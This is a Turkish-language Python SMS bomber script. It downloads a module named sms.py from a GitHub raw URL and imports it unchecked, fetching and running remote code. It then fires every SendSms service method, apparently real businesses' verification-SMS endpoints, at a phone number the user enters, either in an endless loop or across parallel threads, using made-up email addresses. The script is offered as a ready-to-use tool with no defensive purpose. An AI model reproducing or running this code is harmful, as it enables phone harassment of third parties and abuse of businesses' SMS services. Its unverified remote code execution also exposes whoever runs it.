import requests
import threading
import random
from time import sleep
from concurrent.futures import ThreadPoolExecutor, wait
from colorama import Fore, init

init(autoreset=True)

# Doğru URL'yi kullanalım
url = "https://raw.githubusercontent.com/erenxw/sms-bomber/main/sms.py"  # RAW URL

response = requests.get(url)

if response.status_code == 200:
    with open("sms.py", "w") as file:
        file.write(response.text)
    print(Fore.GREEN + "iamluced sms.py dosyası başarıyla indirildi.")
else:
    print(Fore.RED + f"Dosya indirilemedi. HTTP Durum Kodu: {response.status_code}")
    exit()

from sms import SendSms

servisler_sms = [attr for attr in dir(SendSms) if callable(getattr(SendSms, attr)) and not attr.startswith('__')]

stop_flag = False

def generate_random_email():
    domains = ["example.com", "test.com", "demo.com"]
    return f"user{random.randint(1000, 9999)}@{random.choice(domains)}"

def send_sms_normal(tel_liste, kere):
    global stop_flag
    stop_flag = False
    while not stop_flag:
        for tel_no in tel_liste:
            sms = SendSms(tel_no, generate_random_email())
            if isinstance(kere, int):
                while sms.adet < kere and not stop_flag:
                    for attr in servisler_sms:
                        getattr(sms, attr)()
                        sleep(0)  # otomatik aralık 0
            else:
                while not stop_flag:
                    for attr in servisler_sms:
                        getattr(sms, attr)()
                        sleep(0)  # otomatik aralık 0

def send_sms_turbo(tel_no):
    global stop_flag
    stop_flag = False
    send_sms = SendSms(tel_no, generate_random_email())
    try:
        with ThreadPoolExecutor() as executor:
            futures = [executor.submit(getattr(send_sms, attr)) for attr in servisler_sms]
            wait(futures)
    except KeyboardInterrupt:
        print(Fore.GREEN + "İşlem durduruldu.")

def stop_sending():
    global stop_flag
    stop_flag = True
    print(Fore.GREEN + "SMS gönderimi durduruldu.")

def start_normal_sms():
    tel_no = input(Fore.GREEN + "Telefon numarası giriniz (10 haneli): ")

    if len(tel_no) != 10 or not tel_no.isdigit():
        print(Fore.RED + "Hata: Geçersiz telefon numarası. Numara 10 haneli olmalıdır.")
        return

    try:
        kere = int(input(Fore.GREEN + "Kaç Adet (opsiyonel, boş bırakabilirsiniz): ")) if input(Fore.GREEN + "Kaç Adet (opsiyonel, boş bırakabilirsiniz): ") else None
    except ValueError:
        print(Fore.RED + "Hata: Geçersiz sayı girdiniz.")
        return

    tel_liste = [tel_no]
    threading.Thread(target=send_sms_normal, args=(tel_liste, kere)).start()

def start_turbo_sms():
    tel_no = input(Fore.GREEN + "Telefon numarası giriniz (+90 olmadan): ")

    if len(tel_no) != 10 or not tel_no.isdigit():
        print(Fore.RED + "Hata: Geçersiz telefon numarası. Numara 10 haneli olmalıdır.")
        return

    threading.Thread(target=send_sms_turbo, args=(tel_no,)).start()

def display_logo():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    color = random.choice(colors)
    
    logo = f"""
{color}█▀▀ █▀▀█ █▀▀ █▀▀▄
{color}█▀▀ █▄▄▀ █▀▀ █░░█
{color}▀▀▀ ▀░▀▀ ▀▀▀ ▀░░▀
    """
    print(logo)

def main():
    display_logo()  # Logo yalnızca bir kere yazılır ve rastgele renk seçilir.
    print(Fore.CYAN + "=" * 35)
    print(Fore.CYAN + "     İ A M L U C E D ")
    print(Fore.CYAN + "=" * 35)
    
    while True:
        print(Fore.GREEN + "1. Normal SMS Gönder")
        print(Fore.GREEN + "2. Fast SMS Gönder")
        print(Fore.GREEN + "3. Durdur")
        print(Fore.GREEN + "4. Çıkış")
        choice = input(Fore.RED + "Seçiminizi yapın (1/2/3/4): ")

        if choice == '1':
            start_normal_sms()
        elif choice == '2':
            start_turbo_sms()
        elif choice == '3':
            stop_sending()
        elif choice == '4':
            print(Fore.GREEN + "Program sonlandırılıyor.")
            break
        else:
            print(Fore.RED + "Geçersiz seçim. Lütfen tekrar deneyin.")

if __name__ == "__main__":
    main()
